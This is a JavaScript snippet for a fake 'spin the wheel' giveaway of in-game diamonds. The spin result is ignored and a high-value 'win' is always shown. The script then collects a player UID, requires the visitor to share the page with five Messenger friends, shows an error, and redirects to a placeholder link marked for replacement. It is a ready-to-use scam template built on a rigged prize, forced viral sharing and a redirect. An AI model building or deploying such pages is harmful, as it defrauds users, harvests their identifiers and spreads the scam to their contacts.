<script>
const canvas = document.getElementById('wheelCanvas');
const ctx = canvas.getContext('2d');
const segments = ["100 üíé", "500 üíé", "1000 üíé", "2500 üíé", "5000 üíé", "10000 üíé"];
const colors = ["#ff0055", "#00d2ff", "#3a7bd5", "#ffcc00", "#00ff88", "#6a11cb"];
let currentRotation = 0;
let shareClicks = 0;

function drawWheel() {
    const sliceAngle = (2 * Math.PI) / segments.length;
    for (let i = 0; i < segments.length; i++) {
        ctx.beginPath();
        ctx.fillStyle = colors[i];
        ctx.moveTo(125, 125);
        ctx.arc(125, 125, 125, i * sliceAngle, (i + 1) * sliceAngle);
        ctx.fill();
        ctx.save();
        ctx.translate(125, 125);
        ctx.rotate(i * sliceAngle + sliceAngle / 2);
        ctx.fillStyle = "white";
        ctx.font = "bold 14px Arial";
        ctx.fillText(segments[i], 40, 10);
        ctx.restore();
    }
}
drawWheel();

function startSpin() {
    document.getElementById('spin-btn').disabled = true;
    const randomSpin = Math.floor(Math.random() * 360) + 3600; 
    currentRotation += randomSpin;
    canvas.style.transform = `rotate(${currentRotation}deg)`;
    setTimeout(() => {
        const prizes = ["1000 üíé", "2500 üíé", "5000 üíé"];
        let win = prizes[Math.floor(Math.random() * prizes.length)];
        document.getElementById('win-text').innerText = "You Won " + win + "!";
        document.getElementById('uid-section').style.display = "block";
        document.getElementById('spin-btn').style.display = "none";
    }, 4000);
}

function redeem() {
    const uid = document.getElementById('player-uid').value;
    if (uid.length < 5) { alert("Enter a valid UID!"); return; }
    document.getElementById('uid-section').style.display = "none";
    document.getElementById('share-section').style.display = "block";
}

function shareToFriends() {
    shareClicks++;
    let percentage = shareClicks * 20;
    document.getElementById('progress-bar').style.width = percentage + "%";
    document.getElementById('share-count').innerText = "Send to 5 Friends on Messenger (" + shareClicks + "/5)";

    window.open("fb-messenger://share/?link=" + encodeURIComponent(window.location.href), "_blank");

    if (shareClicks >= 5) {
        setTimeout(() => {
            document.getElementById('share-section').style.display = "none";
            document.getElementById('error-section').style.display = "block";
            setTimeout(() => {
                window.location.href = "https://your-xyz-link.com"; // REPLACE WITH YOUR LINK
            }, 3000);
        }, 1000);
    }
}
</script>
